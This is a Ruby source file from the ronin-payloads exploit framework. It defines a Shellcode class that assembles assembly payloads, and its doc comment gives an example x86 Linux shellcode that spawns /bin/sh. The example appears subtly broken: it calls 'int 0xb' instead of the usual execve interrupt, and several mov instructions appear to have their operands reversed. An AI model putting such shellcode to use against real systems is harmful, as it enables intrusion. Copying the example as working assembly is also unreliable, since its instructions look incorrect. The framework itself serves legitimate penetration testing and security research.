#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of ronin-payloads.
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/asm_payload'

module Ronin
  module Payloads
    #
    # A {Payload} class that represents payloads written in assembly which
    # spawn shells or run commands.
    #
    # ## Example
    #
    #     #!/usr/bin/env ronin-payload -f
    #     require 'ronin/payloads/shellcode'
    #     
    #     module Ronin
    #       module Payloads
    #         class LinuxX86BinSh < Ronin::Payloads::Shellcode
    #     
    #           register 'shellcode/linux/x86/bin_sh'
    #
    #           summary 'x86 Linux /bin/sh shellcode'
    #           description <<~EOS
    #             Shellcode that spawns a local /bin/sh shell
    #           EOS
    #     
    #           arch :x86
    #           os :linux
    #     
    #           def build
    #             shellcode do
    #               xor   eax, eax
    #               push  eax
    #               push  0x68732f2f
    #               push  0x6e69622f
    #               mov   esp, ebx
    #               push  eax
    #               push  ebx
    #               mov   esp, ecx
    #               xor   edx, edx
    #               int   0xb
    #             end
    #           end
    #
    #         end
    #       end
    #     end
    #
    class Shellcode < ASMPayload

      protected

      #
      # Assembles Shellcode and sets the `@payload` instance variable.
      #
      # @param [Hash{Symbol => Object}] define
      #   Constants to define in the shellcode.
      #
      # @yield []
      #   The given block represents the instructions of the shellcode.
      #
      # @return [String]
      #   The assembled shellcode.
      #
      # @see #assemble
      #
      def shellcode(define={},&block)
        @payload = assemble(format: :bin, define: define, &block)
      end

    end
  end
end
